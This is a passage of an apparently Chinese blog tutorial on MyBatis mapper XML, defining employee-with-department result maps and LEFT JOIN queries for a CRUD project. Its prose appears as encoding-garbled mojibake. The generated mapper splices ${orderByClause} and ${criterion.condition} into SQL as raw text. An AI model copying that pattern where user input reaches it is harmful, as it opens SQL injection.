class="keyword">distinct</span></span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">include</span> refid=<span class="string">"WithDept_Column_List"</span> /&gt;</span><br><span class="line">  <span class="keyword">from</span> tbl_emp <span class="built_in">e</span></span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> tbl_dept d <span class="keyword">ON</span> <span class="built_in">e</span>.<span class="symbol">`d_id`</span>=d.<span class="symbol">`dept_id`</span></span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"_parameter != null"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">include</span> refid=<span class="string">"Example_Where_Clause"</span> /&gt;</span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">if</span> test=<span class="string">"orderByClause != null"</span>&gt;</span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> $&#123;orderByClause&#125;</span><br><span class="line">  &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure></p><p>åœ¨EmployeeMapper.xmlä¸‹æ·»åŠ resultMap<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;resultMap <span class="built_in">id</span>=<span class="string">"WithDeptResultMap"</span> type=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">id</span> column=<span class="string">"emp_id"</span> jdbcType=<span class="string">"INTEGER"</span> <span class="keyword">property</span>=<span class="string">"empId"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"emp_name"</span> jdbcType=<span class="string">"VARCHAR"</span> <span class="keyword">property</span>=<span class="string">"empName"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"gender"</span> jdbcType=<span class="string">"CHAR"</span> <span class="keyword">property</span>=<span class="string">"gender"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"email"</span> jdbcType=<span class="string">"VARCHAR"</span> <span class="keyword">property</span>=<span class="string">"email"</span> /&gt;</span><br><span class="line">  &lt;<span class="literal">result</span> column=<span class="string">"d_id"</span> jdbcType=<span class="string">"INTEGER"</span> <span class="keyword">property</span>=<span class="string">"dId"</span> /&gt;</span><br><span class="line">  &lt;association <span class="keyword">property</span>=<span class="string">"department"</span> javaType=<span class="string">"com.ceit.crud.bean.Department"</span> &gt;</span><br><span class="line">      &lt;<span class="built_in">id</span> column=<span class="string">"dept_id"</span> <span class="keyword">property</span>=<span class="string">"deptId"</span> /&gt;</span><br><span class="line">      &lt;<span class="literal">result</span> column=<span class="string">"dept_name"</span> <span class="keyword">property</span>=<span class="string">"deptName"</span>/&gt;</span><br><span class="line">  &lt;/association&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure></p><p>å¹¶ä¿®æ”¹selectByExampleWithDeptä¸º<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExampleWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  select</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    distinct</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  from tbl_emp e</span></span><br><span class="line"><span class="xml">  LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>éƒ¨é—¨çš„æŸ¥è¯¢å°±å®Œæˆäº†</p><p>æ¥ç€åŒç†å†™ä¸€ä¸ªä¸»é”®çš„sqlæ ‡ç­¾<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"selectByPrimaryKeyWithDept"</span> resultMap=<span class="string">"WithDeptResultMap"</span>&gt;</span><br><span class="line">  <span class="keyword">select</span></span><br><span class="line">  &lt;<span class="keyword">include</span> refid=<span class="string">"WithDept_Column_List"</span> /&gt;</span><br><span class="line">  <span class="keyword">from</span> tbl_emp <span class="built_in">e</span></span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> tbl_dept d <span class="keyword">ON</span> <span class="built_in">e</span>.<span class="symbol">`d_id`</span>=d.<span class="symbol">`dept_id`</span></span><br><span class="line">  <span class="keyword">where</span> emp_id = #&#123;empId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆçš„EmployeeMapper.xml<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.ceit.crud.dao.EmployeeMapper"</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"BaseResultMap"</span> <span class="attr">type</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"emp_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"empId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"emp_name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"empName"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"gender"</span> <span class="attr">jdbcType</span>=<span class="string">"CHAR"</span> <span class="attr">property</span>=<span class="string">"gender"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"email"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"email"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"d_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"dId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"WithDeptResultMap"</span> <span class="attr">type</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"emp_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"empId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"emp_name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"empName"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"gender"</span> <span class="attr">jdbcType</span>=<span class="string">"CHAR"</span> <span class="attr">property</span>=<span class="string">"gender"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"email"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"email"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"d_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"dId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--    æŒ‡å®šè”åˆæŸ¥è¯¢å‡ºçš„éƒ¨é—¨å­—æ®µçš„å°è£…--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"department"</span> <span class="attr">javaType</span>=<span class="string">"com.ceit.crud.bean.Department"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"dept_id"</span> <span class="attr">property</span>=<span class="string">"deptId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"dept_name"</span> <span class="attr">property</span>=<span class="string">"deptName"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Example_Where_Clause"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"oredCriteria"</span> <span class="attr">item</span>=<span class="string">"criteria"</span> <span class="attr">separator</span>=<span class="string">"or"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"criteria.valid"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">prefixOverrides</span>=<span class="string">"and"</span> <span class="attr">suffix</span>=<span class="string">")"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"criteria.criteria"</span> <span class="attr">item</span>=<span class="string">"criterion"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.noValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.singleValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.betweenValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span><span class="xml"> and #</span><span class="template-variable">&#123;criterion.secondValue&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.listValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">collection</span>=<span class="string">"criterion.value"</span> <span class="attr">item</span>=<span class="string">"listItem"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    #</span><span class="template-variable">&#123;listItem&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Update_By_Example_Where_Clause"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"example.oredCriteria"</span> <span class="attr">item</span>=<span class="string">"criteria"</span> <span class="attr">separator</span>=<span class="string">"or"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"criteria.valid"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">prefixOverrides</span>=<span class="string">"and"</span> <span class="attr">suffix</span>=<span class="string">")"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"criteria.criteria"</span> <span class="attr">item</span>=<span class="string">"criterion"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.noValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.singleValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.betweenValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span><span class="xml"> and #</span><span class="template-variable">&#123;criterion.secondValue&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.listValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">collection</span>=<span class="string">"criterion.value"</span> <span class="attr">item</span>=<span class="string">"listItem"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    #</span><span class="template-variable">&#123;listItem&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Base_Column_List"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    emp_id, emp_name, gender, email, d_id</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"WithDept_Column_List"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--      List&lt;Employee&gt; selectByExampleWithDept(EmployeeExample example);</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    Employee selectByPrimaryKeyWithDept(Integer empId);</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  æŸ¥è¯¢å‘˜å·¥åŒæ—¶å¸¦éƒ¨é—¨--&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExampleWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      distinct</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp e</span></span><br><span class="line"><span class="xml">    LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByPrimaryKeyWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp e</span></span><br><span class="line"><span class="xml">    LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- æŸ¥è¯¢å‘˜å·¥ä¸å¸¦éƒ¨é—¨--&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      distinct</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span 